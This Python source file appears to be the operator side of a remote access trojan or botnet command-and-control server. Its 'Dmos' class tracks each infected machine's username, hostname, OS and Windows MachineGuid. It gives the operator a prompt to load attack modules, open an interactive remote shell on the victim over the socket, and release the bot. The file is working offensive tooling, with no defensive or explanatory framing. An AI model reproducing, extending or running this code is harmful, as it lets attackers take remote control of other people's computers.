import sys, os, threading, time, subprocess, json
from hashlib import md5
from lib.helper import *
from lib.debug import Debug, log
from lib.Protocol.PacketHandler import PacketHandler
from lib.Protocol.PacketType import PacketType
 
class Dmos(PacketHandler):
    def __init__(self, basic, sysinfo, global_addr, conn, server):
        # basic
        self.GLOBAL         = global_addr
        self.LOCAL          = basic["local_addr"]
        self.USERNAME       = basic["user_name"]
        # sys
        self.HOSTNAME       = sysinfo["HOSTNAME"]
        self.OS             = sysinfo["OS"]
        self.ARCH           = sysinfo["ARCH"]
        self.MGUID          = sysinfo["MGUID"]
        # unique hash generated from MachineGuid in Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
        self.md5_hash       = md5(self.MGUID.encode()).hexdigest()
        self.born           = getTime()
        self.conn           = conn
        self.interactive    = False
        self.server         = server
        self.online         = True
    
    def interact(self):
        modules = self.server.modules
        
        while self.online:
            try:
                command = Debug.prompt_input("\[{}] @{} → ".format(self.USERNAME, self.GLOBAL))
                cmd = command.split(' ')[0]
                args = command[len(cmd)+1:]

                baseMessageJSON = {'commandID': cmd}
                if cmd == "use":
                    moduleName = args.split(' ')[0]
                    baseMessageJSON['commandID'] = moduleName
                    if moduleName in modules.keys():
                        modules[moduleName]._exec(self, baseMessageJSON, args)
                elif cmd == "free":
                    self.free_dmos(baseMessageJSON)
                    self.server.terminate_dmos(self.server.control.dmoss, self, signal="gracefully")
                elif cmd == "shell":
                    self.interactive_shell(baseMessageJSON)
                elif cmd == "sysinfo":
                    self.system_info()
                elif cmd == "fat":
                    self.sendPacket(PacketType.Command, baseMessageJSON)
                    #self.conn.send(b'999910015{"ID": "free"}\0')
                    print(PacketType.Command)
                elif cmd == "clear":
                    os.system(CMD_CLEAR)
                elif cmd == "b":
                    self.server.control.cmdline()
            except ConnectionBroken:
                log.error("Command was interrupted by abrupt broken connection")
                continue
    
    def free_dmos(self, baseMessageJSON):
        self.sendPacket(PacketType.Command, baseMessageJSON)
    
    @safe_socket
    def transfer(self, conn):
        """
        Macro function for interactive shell
        """
        log.info("""type "exit" to terminate the spawned shell (press enter to continue...)""")

        while self.interactive == True:
            try:
                buffer = self._recv(0x400)
                print(buffer.decode().lstrip('\n\r'))
                sys.stdout.flush()
            except:
                self.interactive = False

    @safe_socket
    def interactive_shell(self, baseMessageJSON):
        self.sendPacket(PacketType.Command, baseMessageJSON)


        self.interactive = True
        t = threading.Thread(target=self.transfer, args=(self.conn, ))
        t.start()
        while self.online:
            command = input().encode()
            if command == b"exit":
                self._send(command + b"\n")
                self.interactive = False
                time.sleep(0.125)
                break
            self.conn.send(command + b"\n")

    def system_info(self):
        print("GLOBAL   : " + self.GLOBAL)
        print("LOCAL    : " + self.LOCAL)
        print("USERNAME : " + self.USERNAME)
        print("HOSTNAME : " + self.HOSTNAME)
        print("OS       : " + self.OS)
        print("ARCH     : " + self.ARCH)
        print("MGUID    : " + self.MGUID)
        print("HASH     : " + self.md5_hash)
        print("BORN     : " + self.born)

